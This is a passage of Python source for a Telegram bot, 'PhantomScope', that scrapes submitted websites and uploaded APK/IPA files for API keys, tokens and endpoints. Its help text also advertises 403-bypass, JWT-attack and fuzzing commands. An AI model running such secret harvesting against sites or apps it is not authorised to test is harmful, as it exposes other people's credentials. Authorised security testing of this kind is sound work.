    ("Pusher App Key",          re.compile(r'(?i)pusher.{0,20}(?:app.{0,3}key|key).{0,10}[=:\s]["\']([a-f0-9]{20})["\']')),
    ("Pusher Cluster",          re.compile(r'(?i)pusher.{0,20}cluster.{0,10}[=:\s]["\']([a-z]{2,4}\d?)["\']')),
    ("Ably API Key",            re.compile(r'(?i)ably.{0,20}(?:api.{0,3}key|key).{0,10}[=:\s]["\']([A-Za-z0-9.]+:[A-Za-z0-9_\-]+)["\']')),
    ("Cloudflare Beacon Token", re.compile(r'(?i)(?:cloudflare|cf).{0,20}beacon.{0,10}[=:\s]["\']([a-f0-9]{32})["\']')),
    ("Cloudflare Zaraz Token",  re.compile(r'zaraz\.init\s*\(["\']([A-Za-z0-9_\-]{20,60})["\']')),
    ("AWS SNS ARN",             re.compile(r'(arn:aws:sns:[a-z0-9\-]+:\d{12}:[A-Za-z0-9_\-]{1,256})')),
    ("Service Worker Scope",    re.compile(r'(?i)service.?worker.{0,30}["\']([^"\']+/sw\.js[^"\']*)["\']')),
    ("Web Push Auth",           re.compile(r'(?i)push.{0,20}auth.{0,10}[=:\s]["\']([A-Za-z0-9_\-+/=]{20,50})["\']')),
]

_PUSH_JS_EVAL = """() => {
    const res = {};
    // Check service workers
    if ('serviceWorker' in navigator) {
        res['sw_supported'] = 'true';
    }
    // VAPID key from push manager
    ['vapidPublicKey','VAPID_PUBLIC_KEY','NEXT_PUBLIC_VAPID_PUBLIC_KEY',
     'pushPublicKey','WEB_PUSH_PUBLIC_KEY'].forEach(k => {
        try { if (window[k]) res[k] = window[k]; } catch(e) {}
    });
    // OneSignal
    try { if (window.OneSignal) res['OneSignal_loaded'] = 'true'; } catch(e) {}
    // Pusher
    try { if (window.Pusher) res['Pusher_loaded'] = 'true'; } catch(e) {}
    return res;
}"""

def _pushkeys_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _PUSH_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    # ── Option A + B ──────────────────────────────────────────────────
    if progress_cb: progress_cb("🌐 Dynamic push SDK intercept + deep fetch...")
    dyn        = _playwright_dynamic_scan(url, "pushkeys", progress_cb)
    new_assets = _deep_asset_fetch(url, data.get("network_log", []), progress_cb)
    data       = _merge_dynamic_into_data(data, dyn, new_assets)

    # Merge VAPID / SW hook results
    push_hook = dyn.get("hooks", {}).get("push", {})
    if push_hook:
        dr = data.get("dom_result") or {}
        for k, v in push_hook.items():
            if v:
                dr[f"dyn_push_{k}"] = v
        data["dom_result"] = dr

    findings = []; seen = set()
    def _add(t, v, src):
        d = t+":"+v[:60]
        if d not in seen and len(v) >= 5:
            seen.add(d); findings.append({"type": t, "value": v, "source": src})
    if progress_cb: progress_cb("🔍 Scanning for push/CDN keys...")
    for text, label in _gather_all_text(data):
        for key_type, pat in _PUSH_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, val.strip(), label)
    for k, v in (data.get("dom_result") or {}).items():
        s = str(v)
        for key_type, pat in _PUSH_PATTERNS:
            mm = pat.search(s)
            if mm:
                _add(key_type, (mm.group(1) if mm.lastindex else mm.group(0)), f"window.{k}")
    return {"error": None, "findings": findings, "page_url": data["page_url"],
            "requests": len(data.get("network_log", []))}


async def cmd_pushkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/pushkeys <url> — Extract VAPID, FCM, OneSignal, Pusher, Ably push keys"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/pushkeys https://example.com`\n\n"
            "📡 *Detects:*\n"
            "  • VAPID Public Key (Web Push)\n"
            "  • FCM Server Key & Sender ID\n"
            "  • OneSignal App ID\n"
            "  • Pusher App Key & Cluster\n"
            "  • Ably API Key\n"
            "  • Cloudflare Beacon / Zaraz\n"
            "  • AWS SNS ARN\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"📡 *Push Key Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"📡 *Push Keys — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_pushkeys_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel(); await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown'); return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown'); return
    findings = result["findings"]; page_url = result["page_url"]
    if not findings:
        await msg.edit_text(
            f"📡 *Push Key Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 No push/CDN keys found\n🌐 `{page_url}`", parse_mode='Markdown')
        return
    lines = [f"📡 *Push / CDN Keys — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}`\n"]
    for i, f in enumerate(findings, 1):
        lines.append(f"*[{i}] {f['type']}*")
        lines.append(f"  `{f['value'][:80]}`")
        lines.append(f"  _📂 {f['source'][:60]}_\n")
    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
    import io as _io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
                "scanned_at": datetime.now().isoformat(), "findings": findings},
                indent=2, ensure_ascii=False).encode()),
            filename=f"pushkeys_{safe_d}_{ts}.json",
            caption=f"📡 Push Keys — `{domain}` — `{len(findings)}` found",
            parse_mode='Markdown')
    except Exception as e:
        logger.warning("pushkeys export error: %s", e)


# ══════════════════════════════════════════════════
# 💬  10. /chatkeys — Chat, Support & Monitoring Keys
# ══════════════════════════════════════════════════

_CHAT_PATTERNS = [
    ("Intercom App ID",         re.compile(r'(?i)intercom.{0,20}(?:app.{0,3}id|appid).{0,10}[=:\s]["\']([A-Za-z0-9]{8,15})["\']')),
    ("Intercom (boot)",         re.compile(r'(?i)Intercom\s*\(\s*["\']boot["\'],\s*\{[^}]*app_id\s*:\s*["\']([A-Za-z0-9]{8,15})["\']')),
    ("Zendesk Subdomain",       re.compile(r'(?i)(?:zE|zendesk).{0,30}(?:subdomain|key|webwidget).{0,10}[=:\s]["\']([A-Za-z0-9_\-]{5,40})["\']')),
    ("Zendesk Widget Key",      re.compile(r'(?i)zESettings\s*=\s*\{[^}]*webWidget[^}]*key\s*:\s*["\']([a-f0-9\-]{36})["\']')),
    ("Crisp Website ID",        re.compile(r'(?i)crisp.{0,20}(?:website.{0,5}id|CRISP_WEBSITE_ID).{0,10}[=:\s]["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']')),
    ("Drift Embed ID",          re.compile(r'(?i)drift.{0,20}(?:embed|app|id).{0,10}[=:\s]["\']([A-Za-z0-9]{8,20})["\']')),
    ("Freshdesk Domain",        re.compile(r'(https://[a-z0-9\-]+\.freshdesk\.com)')),
    ("Freshchat Token",         re.compile(r'(?i)freshchat.{0,20}token.{0,10}[=:\s]["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']')),
    ("Tawk.to Property ID",     re.compile(r'Tawk_API\.{0,5}(?:onLoad|start).{0,100}([A-Za-z0-9]{20,30}/[A-Za-z0-9]{8,15})')),
    ("HubSpot Chat",            re.compile(r'(?i)hubspot.{0,30}(?:portal|hub.{0,3}id).{0,10}[=:\s]["\']?(\d{6,12})\b')),
    ("Sentry DSN",              re.compile(r'(https://[a-f0-9]{32}@(?:o\d+\.ingest\.)?sentry\.io/\d+)')),
    ("Sentry Organization",     re.compile(r'(?i)sentry.{0,20}(?:org|dsn).{0,10}[=:\s]["\']([A-Za-z0-9\-]{5,40})["\']')),
    ("LogRocket App ID",        re.compile(r'(?i)logrocket.{0,20}init\s*\(\s*["\']([A-Za-z0-9/_\-]{10,50})["\']')),
    ("Bugsnag API Key",         re.compile(r'(?i)bugsnag.{0,20}(?:api.{0,3}key|notify).{0,10}[=:\s]["\']([a-f0-9]{32})["\']')),
    ("Raygun API Key",          re.compile(r'(?i)raygun.{0,20}(?:api.{0,3}key).{0,10}[=:\s]["\']([A-Za-z0-9+/=]{20,44})["\']')),
    ("Rollbar Token",           re.compile(r'(?i)rollbar.{0,20}(?:access.{0,3}token|token).{0,10}[=:\s]["\']([a-f0-9]{32})["\']')),
    ("LiveChat License",        re.compile(r'(?i)livechat.{0,20}license.{0,10}[=:\s]["\']?(\d{6,12})\b')),
    ("Tidio Chat Key",          re.compile(r'(?i)tidioChatCode\s*=\s*["\']([A-Za-z0-9]{20,40})["\']')),
    ("Olark Site ID",           re.compile(r'(?i)olark.{0,20}(?:site.{0,3}id|identify).{0,10}[=:\s]["\']([A-Za-z0-9\-]{20,40})["\']')),
    ("Chatwoot Token",          re.compile(r'(?i)chatwoot.{0,20}(?:website.{0,5}token|token).{0,10}[=:\s]["\']([A-Za-z0-9]{20,50})["\']')),
]

_CHAT_JS_EVAL = """() => {
    const res = {};
    ['Intercom','zE','Tawk_API','drift','fcWidget','HubSpotConversations',
     'Sentry','LogRocket','Bugsnag','Rollbar','LiveChatWidget'].forEach(k => {
        try { if (window[k]) res[k+'_loaded'] = 'true'; } catch(e) {}
    });
    return res;
}"""

def _chatkeys_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _CHAT_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}
    findings = []; seen = set()
    def _add(t, v, src):
        d = t+":"+v[:60]
        if d not in seen and len(v) >= 5:
            seen.add(d); findings.append({"type": t, "value": v, "source": src})
    if progress_cb: progress_cb("🔍 Scanning for chat & monitoring keys...")
    for text, label in _gather_all_text(data):
        for key_type, pat in _CHAT_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, val.strip(), label)
    return {"error": None, "findings": findings, "page_url": data["page_url"],
            "requests": len(data.get("network_log", []))}


async def cmd_chatkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/chatkeys <url> — Extract Intercom, Zendesk, Crisp, Sentry, Bugsnag widget keys"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/chatkeys https://example.com`\n\n"
            "💬 *Detects:*\n"
            "  • Intercom App ID\n"
            "  • Zendesk Widget Key\n"
            "  • Crisp, Drift, Freshchat, Tawk.to\n"
            "  • HubSpot, LiveChat, Tidio, Olark\n"
            "  • Sentry DSN\n"
            "  • LogRocket, Bugsnag, Raygun, Rollbar\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"💬 *Chat Key Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"💬 *Chat Keys — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_chatkeys_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel(); await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown'); return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown'); return
    findings = result["findings"]; page_url = result["page_url"]
    if not findings:
        await msg.edit_text(
            f"💬 *Chat Key Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 No chat/monitoring keys found\n🌐 `{page_url}`", parse_mode='Markdown')
        return
    lines = [f"💬 *Chat & Monitoring Keys — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}`\n"]
    for i, f in enumerate(findings, 1):
        lines.append(f"*[{i}] {f['type']}*")
        lines.append(f"  `{f['value'][:80]}`")
        lines.append(f"  _📂 {f['source'][:60]}_\n")
    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
    import io as _io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
                "scanned_at": datetime.now().isoformat(), "findings": findings},
                indent=2, ensure_ascii=False).encode()),
            filename=f"chatkeys_{safe_d}_{ts}.json",
            caption=f"💬 Chat Keys — `{domain}` — `{len(findings)}` found",
            parse_mode='Markdown')
    except Exception as e:
        logger.warning("chatkeys export error: %s", e)



# ══════════════════════════════════════════════════
# 🤖  BOT — USER COMMANDS
# ══════════════════════════════════════════════════


async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/mystats — Detailed personal statistics"""
    uid = update.effective_user.id
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, uid, update.effective_user.first_name)
        reset_daily(u)
        _save_db_sync(db)

    lim      = get_limit(db, u)
    dls      = u.get("downloads", [])
    total_mb = sum(d.get("size_mb", 0) for d in dls)
    success  = sum(1 for d in dls if d.get("status") == "success")
    failed   = len(dls) - success

    bar = pbar(u["count_today"], lim if lim > 0 else max(u["count_today"], 1))

    await update.effective_message.reply_text(
        "📊 *My Statistics*\n\n"
        "👤 *%s*\n"
        "🆔 `%d`\n\n"
        "📅 *Today:*\n"
        "`%s`\n"
        "Used: `%d` / `%s`\n\n"
        "📦 *All Time:*\n"
        "Downloads: `%d` total\n"
        "✅ Success: `%d`  ❌ Failed: `%d`\n"
        "💾 Data: `%.1f MB`" % (
            u["name"], uid,
            bar, u["count_today"], "∞" if lim == 0 else str(lim),
            u["total_downloads"], success, failed, total_mb,
        ),
        parse_mode="Markdown"
    )





async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    User က APK/IPA/ZIP/JAR upload လုပ်ရင် auto-detect ပြီး analyze လုပ်
    """
    doc = update.message.document
    if not doc:
        return

    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"

    # ── Force join check ─────────────────────────
    if not await check_force_join(update, context):
        return

    # ── File type check ──────────────────────────
    fname    = doc.file_name or ""
    ext      = os.path.splitext(fname.lower())[1]
    fsize_mb = doc.file_size / 1024 / 1024 if doc.file_size else 0

    if ext not in _APP_EXTS:
        # Not an app file — ignore silently
        return

    # ── Size limit ───────────────────────────────
    if fsize_mb > APP_MAX_MB:
        await update.message.reply_text(
            f"⚠️ File ကြီးလွန်းတယ် (`{fsize_mb:.1f}MB`)\n"
            f"📏 Max: `{APP_MAX_MB}MB`",
            parse_mode='Markdown'
        )
        return

    # ── Rate limit ───────────────────────────────
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.message.reply_text(f"⏱️ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    file_type = _APP_EXTS.get(ext, ext.upper())
    msg = await update.message.reply_text(
        f"📱 *{file_type} Detected!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 `{fname}`\n"
        f"💾 `{fsize_mb:.1f} MB`\n\n"
        f"⬇️ Downloading from Telegram...",
        parse_mode='Markdown'
    )

    # ── Download file from Telegram ──────────────
    work_dir  = os.path.join(APP_ANALYZE_DIR, str(uid))
    os.makedirs(work_dir, exist_ok=True)
    safe_name = re.sub(r'[^\w\.\-]', '_', fname)
    save_path = os.path.join(work_dir, safe_name)

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        await tg_file.download_to_drive(save_path)
    except Exception as e:
        await msg.edit_text(f"❌ Download error: `{type(e).__name__}`", parse_mode='Markdown')
        return

    # ── Save path for /appassets command ─────────
    async with db_lock:
        db2 = _load_db_sync()
        u2  = get_user(db2, uid, uname)
        u2["last_uploaded_app"] = save_path
        _save_db_sync(db2)

    await msg.edit_text(
        f"📱 *{file_type} — `{fname}`*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Downloaded `{fsize_mb:.1f}MB`\n\n"
        f"🔍 Phase 1: Text/Source scanning...\n"
        f"📦 Phase 2: Binary string extraction...\n"
        f"🔑 Phase 3: Secret/key detection...\n\n"
        f"⏳ Analyzing...",
        parse_mode='Markdown'
    )

    # ── Progress tracking ─────────────────────────
    prog_q = []
    async def _prog_loop():
        while True:
            await asyncio.sleep(3)
            if prog_q:
                txt = prog_q[-1]; prog_q.clear()
                try:
                    await msg.edit_text(
                        f"📱 *Analyzing `{fname}`*\n\n{txt}",
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass

    prog_task = asyncio.create_task(_prog_loop())

    try:
        result = await asyncio.to_thread(
            analyze_app_file, save_path, lambda t: prog_q.append(t)
        )
    except Exception as e:
        prog_task.cancel()
        await msg.edit_text(f"❌ Analysis error: `{type(e).__name__}`\n`{str(e)[:100]}`",
                            parse_mode='Markdown')
        try: os.remove(save_path)
        except: pass
        return
    finally:
        prog_task.cancel()

    # ── Keep file for /appassets — remove previous file if any ──
    async with db_lock:
        db_pre = _load_db_sync()
        u_pre  = get_user(db_pre, uid, uname)
        old_path = u_pre.get("last_uploaded_app")
        if old_path and old_path != save_path:
            try: os.remove(old_path)
            except: pass

    # ══ Build result report ═══════════════════════
    app_info = result.get("app_info", {})
    urls     = result.get("urls", [])
    api_paths= result.get("api_paths", [])
    ws_urls  = result.get("ws_urls", [])
    secrets  = result.get("secrets", {})
    src_files= result.get("source_files", [])
    stats    = result.get("stats", {})
    errors   = result.get("errors", [])

    # ── Platform badge ────────────────────────────
    platform = app_info.get("platform", "")
    plat_icon = "🤖" if platform == "Android" else ("🍎" if platform == "iOS" else "📦")

    lines = [
        f"📱 *App Analysis — `{fname}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"{plat_icon} `{result['file_type']}` | 💾 `{result['file_size_mb']}MB`",
        f"📂 Files: `{stats.get('total_files',0)}` | Scanned: `{stats.get('text_files_scanned',0)}`",
        f"🌐 URLs: `{stats.get('unique_urls',0)}` | 🛤 API Paths: `{stats.get('api_paths',0)}`",
        f"🔌 WebSocket: `{stats.get('ws_urls',0)}` | 🔑 Secret types: `{stats.get('secret_types',0)}`",
        "",
    ]

    # App Info
    if app_info:
        lines.append(f"*{'🤖 Android' if platform == 'Android' else '🍎 iOS'} App Info:*")
        pkg = app_info.get("package") or app_info.get("bundle_id", "")
        if pkg:
            lines.append(f"  📦 `{pkg}`")
        perms = app_info.get("permissions", [])[:8]
        if perms:
            lines.append(f"  🔐 Permissions: `{', '.join(perms[:5])}`{'...' if len(perms)>5 else ''}")
        url_schemes = app_info.get("url_schemes", [])
        if url_schemes:
            lines.append(f"  🔗 URL Schemes: `{'`, `'.join(url_schemes[:4])}`")
        # Meta-data with potential API keys
        meta = app_info.get("meta_data", {})
        interesting_meta = {k: v for k, v in meta.items()
                           if any(kw in k.lower() for kw in
                                  ['api', 'key', 'secret', 'token', 'firebase',
                                   'google', 'facebook', 'stripe', 'url', 'host'])}
        if interesting_meta:
            lines.append(f"  🗝 Meta-data keys ({len(interesting_meta)}):")
            for k, v in list(interesting_meta.items())[:5]:
                lines.append(f"     • `{k}` = `{v[:40]}`")
        # iOS plist keys
        plist_keys = app_info.get("keys", {})
        if plist_keys:
            lines.append(f"  🗝 Config keys ({len(plist_keys)}):")
            for k, v in list(plist_keys.items())[:5]:
                lines.append(f"     • `{k}` = `{v[:40]}`")
        lines.append("")

    # Secrets found
    if secrets:
        lines.append(f"*🔑 Potential Secrets Found ({len(secrets)} types):*")
        for name, count in sorted(secrets.items(), key=lambda x: -x[1]):
            risk = "🔴" if name in ('AWS Key', 'AWS Secret', 'Private Key', 'Stripe Key',
                                     'Hardcoded Pass', 'JWT Token') else "🟡"
            lines.append(f"  {risk} `{name}` × {count}")
        lines.append("")

    # API paths
    if api_paths:
        lines.append(f"*🛤 API Paths ({len(api_paths)}):*")
        for p in api_paths[:15]:
            lines.append(f"  🟢 `{p}`")
        if len(api_paths) > 15:
            lines.append(f"  _...and {len(api_paths)-15} more in JSON report_")
        lines.append("")

    # Full URLs (top domains)
    if urls:
        # Group by domain
        domain_map = {}
        for u in urls:
            try:
                d = urlparse(u).netloc
                domain_map.setdefault(d, []).append(u)
            except Exception:
                pass
        lines.append(f"*🌐 Hosts Found ({len(domain_map)} unique):*")
        for domain, durls in sorted(domain_map.items(), key=lambda x: -len(x[1]))[:10]:
            lines.append(f"  🔵 `{domain}` ({len(durls)} URLs)")
        lines.append("")

    # WebSocket
    if ws_urls:
        lines.append(f"*🔌 WebSocket URLs ({len(ws_urls)}):*")
        for w in ws_urls[:5]:
            lines.append(f"  🟣 `{w[:80]}`")
        lines.append("")

    # Top source files
    if src_files:
        lines.append(f"*📄 Hot Source Files ({len(src_files)}):*")
        for sf in src_files[:8]:
            fname_short = sf["file"].split("/")[-1]
            tags = []
            if sf["urls"] > 0:   tags.append(f"{sf['urls']} URLs")
            if sf["secrets"]:    tags.append(f"🔑 {','.join(sf['secrets'][:2])}")
            lines.append(f"  📝 `{fname_short}` — {' | '.join(tags)}")
        lines.append("")

    if errors:
        lines.append(f"⚠️ _Errors: {len(errors)}_")

    lines.append("⚠️ _Passive analysis only — no exploitation_")

    report_text = "\n".join(lines)

    # ── Send text report ──────────────────────────
    try:
        if len(report_text) <= 4000:
            await msg.edit_text(report_text, parse_mode='Markdown')
        else:
            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
            await update.message.reply_text(report_text[4000:8000], parse_mode='Markdown')
    except Exception:
        await update.message.reply_text(report_text[:4000], parse_mode='Markdown')

    # ── Export full JSON report ───────────────────
    try:
        safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(fname)[0])
        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_path  = os.path.join(APP_ANALYZE_DIR, f"app_{safe_fname}_{ts}.json")

        export = {
            "filename":    fname,
            "file_type":   result["file_type"],
            "file_size_mb":result["file_size_mb"],
            "analyzed_at": datetime.now().isoformat(),
            "app_info":    app_info,
            "stats":       stats,
            "api_paths":   api_paths,
            "urls":        urls,
            "ws_urls":     ws_urls,
            "secrets_found": {k: f"×{v}" for k, v in secrets.items()},
            "source_files":  src_files,
            "errors":        errors[:20],
        }
        with open(json_path, 'w', encoding='utf-8') as jf:
            json.dump(export, jf, ensure_ascii=False, indent=2)

        cap = (
            f"📦 *App Analysis Report*\n"
            f"📱 `{fname}`\n"
            f"🌐 `{stats.get('unique_urls',0)}` URLs | "
            f"🛤 `{stats.get('api_paths',0)}` API paths | "
            f"🔑 `{stats.get('secret_types',0)}` secret types"
        )
        with open(json_path, 'rb') as jf:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=jf,
                filename=f"app_{safe_fname}_{ts}.json",
                caption=cap,
                parse_mode='Markdown'
            )
        os.remove(json_path)

    except Exception as e:
        logger.warning("App JSON export error: %s", e)



async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    async with db_lock:
        db2 = _load_db_sync()
        get_user(db2, uid, uname)
        _save_db_sync(db2)

    js_badge = "✅ Ready" if PLAYWRIGHT_OK else "⚠️ Not installed"
    adm_row  = [[InlineKeyboardButton("👑 Admin Panel", callback_data="help_admin")]] if uid in ADMIN_IDS else []

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📥 Download",      callback_data="help_download"),
            InlineKeyboardButton("🔍 Scan Tools",    callback_data="help_scan"),
        ],
        [
            InlineKeyboardButton("🔑 Key Extract",   callback_data="help_keys"),
            InlineKeyboardButton("🕵️ Recon",          callback_data="help_recon"),
        ],
        [
            InlineKeyboardButton("📱 App Analyzer",  callback_data="help_app"),
            InlineKeyboardButton("📊 My Account",    callback_data="help_account"),
        ],
        *adm_row,
        [InlineKeyboardButton("📖 Full Command List", callback_data="help_all")],
    ])

    await update.effective_message.reply_text(
        f"👋 *မင်္ဂလာပါ, {uname}!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 *PhantomScope Bot v18.0*\n\n"
        f"Web security scanning, recon & download toolkit.\n\n"
        f"🖥️ JS Engine: `{js_badge}`\n"
        f"🔒 SSRF Protected · Rate Limited · Queued\n\n"
        f"⬇️ *Category တစ်ခုရွေးပြီး commands ကြည့်ပါ:*",
        parse_mode='Markdown',
        reply_markup=keyboard,
    )


# ── Help text per category ────────────────────────────────────────────
_HELP_TEXTS = {
    "help_download": (
        "📥 *Download Commands*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "  /download `<url>` — Single page HTML + assets\n"
        "  /fullsite `<url>` — Full website crawl\n"
        "  /jsdownload `<url>` — JS/React/Vue/Angular\n"
        "  /jsfullsite `<url>` — JS + full crawl\n"
        "  /resume `<url>` — ကျသွားလျှင် ဆက်လုပ်ရန်\n"
        "  /stop — Download ရပ်ရန်\n\n"
        "💡 _50MB+ ဆိုရင် auto-split ဖြင့် ပေးပို့မည်_"
    ),
    "help_scan": (
        "🔍 *Scan & Security Tools*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "  /vuln `<url>` — Vulnerability scanner\n"
        "  /api `<url>` — API endpoint discovery\n"
        "  /tech `<url>` — Tech stack fingerprint\n"
        "  /extract `<url>` — Secret/key extractor\n"
        "  /antibot `<url>` — Anti-bot bypass tester\n"
        "  /jwtattack `<token>` — JWT decode & attack\n"
        "  /sitekey `<url>` — Captcha key extractor\n"
        "  /monitor `add <url>` — Page change alert\n"
        "  /keydump `<url>` — All-in-one key dump"
    ),
    "help_keys": (
        "🔑 *Key Extraction Tools*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "  /apikeys `<url>` — Google, OpenAI, AWS, Twilio\n"
        "  /firebase `<url>` — Firebase config\n"
        "  /paykeys `<url>` — Stripe, PayPal, Square\n"
        "  /socialkeys `<url>` — OAuth app IDs\n"
        "  /analytics `<url>` — GA4, GTM, Pixel IDs\n"
        "  /hiddenkeys `<url>` — CSRF tokens, JWT\n"
        "  /pushkeys `<url>` — VAPID, FCM, OneSignal\n"
        "  /endpoints `<url>` — REST/GraphQL endpoints\n"
        "  /webhooks `<url>` — Webhook URLs\n"
        "  /oauthscan `<url>` — OAuth config scan\n\n"
        "💡 _Dynamic Playwright + deep asset fetch included_"
    ),
    "help_recon": (
        "🕵️ *Recon Tools*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "  /subdomains `<domain>` — Subdomain enum\n"
        "  /bypass403 `<url>` — 403 bypass (50+ techniques)\n"
        "  /fuzz `<url>` — Path & param fuzzer\n"
        "  /smartfuzz `<url>` — Context-aware smart fuzzer\n"
        "  /monitor `<url>` — Page change monitor\n\n"
        "💡 _crt.sh + bruteforce + wildcard detection_"
    ),
    "help_app": (
        "📱 *App Analyzer*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Chat ထဲ file drop ရုံသာ!\n\n"
        "Supported: `APK` `IPA` `ZIP` `JAR` `AAB`\n\n"
        "  → API endpoints extraction\n"
        "  → Secrets & API keys\n"
        "  → AndroidManifest / Info.plist parse\n"
        "  → Host/domain list\n"
        "  → JSON report auto-export\n\n"
        "  /appassets `<url>` — Web app asset analyzer"
    ),
    "help_account": (
        "📊 *My Account*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "  /status — Daily usage & limit\n"
        "  /history — Download log (last 10)\n"
        "  /mystats — Detailed statistics\n\n"
        "💡 _Daily limit reset မှာ midnight UTC_"
    ),
    "help_admin": (
        "👑 *Admin Commands*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "  /admin — Admin panel\n"
        "  /ban `/unban <uid>` — User ban\n"
        "  /setlimit `<uid> <n>` — Download limit\n"
        "  /userinfo `<uid>` — User details\n"
        "  /broadcast `<msg>` — All users message\n"
        "  /allusers — User list\n"
        "  /setpages `/setassets` — Limits\n"
        "  /proxy — Proxy pool status\n"
